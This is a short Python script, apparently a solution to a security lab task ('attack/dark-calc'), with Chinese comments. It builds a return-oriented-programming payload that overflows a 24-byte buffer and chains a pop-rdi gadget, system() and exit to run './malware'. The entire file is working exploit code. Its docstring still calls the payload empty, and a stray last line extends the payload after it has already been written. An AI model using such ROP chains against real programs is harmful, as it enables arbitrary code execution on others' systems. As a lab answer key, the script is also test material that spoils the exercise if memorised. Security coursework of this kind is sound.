#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(x):
    return struct.pack('<Q', x)

pop_rdi_ret = 0x401c93     # gadget: pop rdi; ret
system_addr = 0x4017e0     # system 函数的地址
strcpy_dest = 0x6030d0     # strcpy 将字符串复制到的全局地址
exit_addr   = 0x401880     # exit@plt 的地址（用来优雅退出）

# 放入要执行的命令
cmd = b'./malware\x00'

# 填充字节，确保覆盖到返回地址（总长 24 字节）
padding = b'A' * (24 - len(cmd))
# 组装 ROP 链
payload = cmd + padding
payload += p64(pop_rdi_ret)    # 1. pop rdi; ret
payload += p64(strcpy_dest)    # 2. rdi 变成 0x6030d0
payload += p64(system_addr)    # 3. 调用 system(0x6030d0) 执行脚本
payload += p64(exit_addr)      # 4. system 返回后，调用 exit 退出程序

sys.stdout.buffer.write(payload)
payload += p64(0x401880)  # exit@plt